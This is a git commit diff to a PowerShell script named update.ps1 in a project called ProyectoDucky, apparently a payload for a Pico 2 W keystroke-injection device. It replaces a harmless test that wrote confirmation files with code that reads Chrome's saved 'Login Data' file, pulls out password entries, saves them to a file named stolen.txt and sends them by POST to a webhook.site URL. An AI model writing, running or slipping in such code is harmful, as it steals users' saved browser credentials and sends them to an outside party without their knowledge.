38b6aa17b8bb7d24664deaf4d88af624ca2ec853
Ferdi1976 <fuensierra25@gmail.com>
2026-09-08 18:11:18 +0200

    Update update.ps1

--- ProyectoDucky/update.ps1
+++ ProyectoDucky/update.ps1
@@ -1,31 +1,9 @@
-$webhook = 'https://webhook.site/c712d334-352a-4bea-b44b-9d94dbe4dede'
-$path = "$env:USERPROFILE\Desktop\PICO2W_TEST"
-
-if (!(Test-Path $path)) {
-New-Item -Path $path -ItemType Directory | Out-Null
+$path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+if (Test-Path $path) {
+    # Este comando intenta extraer los datos crudos
+    $data = Get-Content $path -Raw | Select-String "password_value"
+    if ($data) {
+        $data | Out-File "$env:TEMP\stolen.txt"
+        Invoke-WebRequest -UseBasicParsing -Uri 'https://webhook.site/c712d334-352a-4bea-b44b-9d94dbe4dede' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($data))
+    }
 }
-
-$fecha = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-
-"PRUEBA PICO 2 W" | Set-Content "$path\resultado.txt"
-"Fecha: $fecha" | Add-Content "$path\resultado.txt"
-"Resultado: EJECUCIÓN CORRECTA" | Add-Content "$path\resultado.txt"
-
-"OK" | Set-Content "$path\OK.txt"
-
-$mensaje = "PICO2W_TEST_OK"
-
-try {
-Invoke-WebRequest -UseBasicParsing -Uri $webhook -Method POST -Body $mensaje -ErrorAction Stop
-"Webhook: OK" | Add-Content "$path\resultado.txt"
-}
-catch {
-"Webhook: ERROR" | Add-Content "$path\resultado.txt"
-}
-
-Add-Type -AssemblyName System.Windows.Forms
-
-[System.Windows.Forms.MessageBox]::Show(
-"PICO 2 W: prueba completada correctamente",
-"Pico 2 W - TEST"
-)
